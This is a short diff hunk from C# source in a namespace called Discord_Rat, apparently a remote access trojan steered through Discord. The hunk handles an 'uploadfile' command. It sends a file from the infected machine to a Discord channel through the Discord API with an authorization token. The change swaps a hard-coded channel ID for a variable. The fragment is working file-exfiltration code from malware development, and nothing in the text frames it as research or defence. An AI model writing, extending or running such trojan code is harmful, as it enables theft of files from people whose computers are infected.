@@ -448,7 +448,7 @@ namespace Discord_Rat
                         command = command + "423849203";
                         WebClient w = new WebClient();
                         w.Headers["Authorization"] = value;
-                        w.UploadFile("https://discordapp.com/api/v6/channels/555816846364901389/messages", Between(command, $";uploadfile {name} ", "423849203"));
+                        w.UploadFile($"https://discordapp.com/api/v6/channels/{cID}/messages", Between(command, $";uploadfile {name} ", "423849203"));
                     }
                     catch
                     {
